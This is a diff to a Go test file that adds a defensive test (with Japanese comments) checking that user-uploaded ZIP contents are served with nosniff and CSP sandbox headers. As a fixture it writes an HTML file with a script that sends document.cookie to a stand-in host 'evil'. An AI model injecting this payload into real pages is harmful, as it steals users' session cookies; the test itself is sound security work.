@@ -181,3 +181,44 @@ func TestZipCacheFileServeIsolatesUsers(t *testing.T) {
 		}
 	})
 }
+
+// TestZipCacheFileServeSetsSecurityHeaders は、利用者のファイルをそのまま返す経路に
+// セキュリティヘッダが付くことを確認する。
+//
+// この経路は取り込んだZIPの展開物を、拡張子から決めたContent-Typeで
+// 同一オリジンから配信する。展開時に拡張子の許可リストは無いので、
+// 受け取った .cbz にHTMLが入っていればHTMLとして解釈される。
+// セッションクッキーはクライアント側のJSが document.cookie で書いており
+// HttpOnly を付けられないため、同一オリジンでスクリプトが動くと読み出せてしまう。
+// CSP sandbox は allow-scripts を付けていないので中のJSは実行されない。
+//
+// ルート登録は serve.go と同じ形にしないとラッパーを通らないので注意。
+func TestZipCacheFileServeSetsSecurityHeaders(t *testing.T) {
+	gkillAPI, optCleanup := setupTestGkillServerAPI(t)
+	defer optCleanup()
+
+	router := gkillAPI.GkillDAOManager.GetRouter()
+	router.PathPrefix("/zip_cache/").HandlerFunc(
+		withUserContentSecurityHeaders(gkillAPI.wrapNoAuth(gkillAPI.HandleZipCacheFileServe)))
+	ts := httptest.NewServer(router)
+	defer ts.Close()
+
+	sessionID := addZipCacheTestUser(t, gkillAPI, "carol")
+	// ZIPの中身としてHTMLが混じっている状況を作る
+	// index.html は http.FileServer がディレクトリへリダイレクトしてしまうので別名にする
+	htmlPath := writeZipCacheFile(t, "carol", "comics", "cccccccc", "page.html",
+		"<script>fetch('//evil/'+document.cookie)</script>")
+
+	resp := getZipCache(t, ts, htmlPath, sessionID)
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want 200", resp.StatusCode)
+	}
+	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
+		t.Errorf("X-Content-Type-Options = %q, want %q", got, "nosniff")
+	}
+	if got := resp.Header.Get("Content-Security-Policy"); got != "sandbox" {
+		t.Errorf("Content-Security-Policy = %q, want %q", got, "sandbox")
+	}
+}
